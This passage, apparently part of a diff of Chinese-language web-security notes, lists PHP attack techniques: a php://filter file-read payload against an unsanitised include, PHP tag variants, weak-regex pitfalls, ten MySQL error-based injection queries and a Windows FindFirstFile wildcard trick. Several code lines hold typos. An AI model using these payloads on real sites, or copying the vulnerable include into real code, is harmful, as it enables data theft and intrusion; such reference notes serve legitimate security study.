+> >                 ```
+> >         
+> > 		- `php://`输入输出流
+> >             
+> > 			```php
+> > 			#!php
+> > 			<?php
+> > 				include($_GET['file']);
+> > 			?>
+> > 			1.php?file=php://filter/convert.base64-encode(内容被base64编码)/resource=example.txt(远程文件)
+> > 			```
+> >         
+> > 		- php代码解析标签
+> >             
+> > 			`<script language="php">…</script>`
+> > 			
+> >             `<?…?>`：php3.0.4版本后可用
+> > 			
+> >             `<%…%>`：asp标签，需要`asp_tags=on`，默认是`off`
+> >         
+> > 		- 正则表达式
+> >             
+> > 			没有使用`^`和`$`限定匹配开始位置
+> > 			
+> >             特殊字符未转义
+> >         
+> > 		- 报错注入
+> >             
+> > 			```php
+> > 			<?php
+> > 				¥conn= mysql_connect("localhost","root","root");
+> > 				mysql_select_db("test",$conn);
+> > 				$sql1 = "SELECT 1 FROM (SELECT count(*),concat(USER(),floor(rand(0)*2)) x FROM
+> > 						information_schema.TABLES GROUP BY x) a";
+> > 				$sql2 = "SELECT * FROM user WHERE id = 1 and 
+> > 						(extractvalue(1,concat(0x5c,(SELECT user()))))";
+> > 				$sql3 = "SELECT * FROM user WHERE id = 1 and 
+> > 						(updatexml(1.concat(0x5c24,(SELECT user()),0x5e24),1))";
+> > 				$sql4 = "SELECT * FROM user WHERE id = 1 and 
+> > 						GeometryCollection((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
+> > 				$sql5 = "SELECT * FROM user WHERE id = 1 and 
+> > 						polygon((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
+> > 				$sql6 = "SELECT * FROM user WHERE id = 1 and 
+> > 						multipoint((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
+> > 				$sql7 = "SELECT * FROM user WHERE id = 1 and 
+> > 						multilinestring((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
+> > 				$sql8 = "SELECT * FROM user WHERE id = 1 and 
+> > 						multiolygon((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
+> > 				$sql9 = "SELECT * FROM user WHERE id = 1 and 
+> > 						linestring((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
+> > 				$sql10 = "SELECT * FROM user WHERE id = 1 and 
+> > 						exp(~(SELECT * FROM(SELECT user())a))";
+> > 				$res = mysql_query($sql10);
+> > 				if(!res){
+> > 					echo mysql_error();
+> > 				}
+> > 			?>
+> > 			```
+> >         
+> > 		- windows findfirstfile利用
+> >             
+> > 			若要搜索12345.txt文件，可使用`1<<`来代替或者`12<<`，不可以单独使用一个"`<`"或"`>`"，因为单独一个只是代表了一个字符，两个代表多个字符
+
+
+
+
+
+
